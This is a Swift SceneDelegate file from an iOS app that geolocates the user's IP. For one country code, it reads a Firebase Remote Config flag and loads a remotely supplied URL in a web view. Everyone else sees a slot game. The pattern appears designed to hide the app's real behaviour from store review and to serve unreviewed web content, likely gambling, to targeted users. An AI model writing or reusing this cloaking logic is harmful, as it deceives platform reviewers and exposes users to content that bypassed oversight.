import UIKit
import FirebaseRemoteConfig

class SceneDelegate: UIResponder, UIWindowSceneDelegate {
    
    var window: UIWindow?
    var remoteConfig = RemoteConfig.remoteConfig()
    var activityView: UIActivityIndicatorView?
    
    
    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
        guard let windowScene = (scene as? UIWindowScene) else { return }
        window = UIWindow(windowScene: windowScene)
        window?.backgroundColor = UIColor.white
        checkIP(window: window)
        window?.makeKeyAndVisible()
    }
    
    private func checkIP(window: UIWindow?) {
        IPMagager.getIpLocation { code, error in
            if error != nil {
                print("ERROR IP MANAGER: \(error?.localizedDescription ?? "")")
            } else {
                switch code {
                case "BYs":
                    self.showActivityIndicator()
                    self.setupViewController(window: window)
                default:
                    window?.rootViewController = SlotViewController()
                }
            }
        }
    }
    
    private func setupViewController(window: UIWindow?) {
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig.configSettings = settings
        remoteConfig.fetchAndActivate { status, error in
            if error != nil {
                self.hideActivityIndicator()
                window?.rootViewController = SlotViewController()
                print("ERROR CONFIG: \(error?.localizedDescription ?? "")")
            } else {
                if status != .error {
                    if self.remoteConfig["notIsHidden"].boolValue {
                        if let urlString = self.remoteConfig["urlString"].stringValue {
                            guard let url = URL(string: urlString) else { return }
                            self.hideActivityIndicator()
                            window?.rootViewController = WebViewController(url: url)
                        } else {
                            self.hideActivityIndicator()
                            window?.rootViewController = SlotViewController()
                        }
                    } else {
                        print("ID -> \(Model.instance.getDeviseId())")
                        if Model.instance.getDeviseId() != "" {
                            if let urlString = self.remoteConfig["urlString"].stringValue {
                                guard let url = URL(string: urlString) else { return }
                                self.hideActivityIndicator()
                                window?.rootViewController = WebViewController(url: url)
                            } else {
                                self.hideActivityIndicator()
                                window?.rootViewController = SlotViewController()
                            }
                        } else {
                            self.hideActivityIndicator()
                            window?.rootViewController = SlotViewController()
                        }
                    }
                } else {
                    self.hideActivityIndicator()
                    window?.rootViewController = SlotViewController()
                }
            }
        }
    }
    
    func showActivityIndicator() {
        if #available(iOS 13.0, *) {
            activityView = UIActivityIndicatorView(style: .medium)
        }
        activityView?.color = .black
        activityView?.center = window?.center ?? CGPoint.zero
        window?.addSubview(activityView!)
        activityView?.startAnimating()
    }

    func hideActivityIndicator(){
        if (activityView != nil) {
            activityView?.stopAnimating()
            activityView?.hidesWhenStopped = true
        }
    }
}

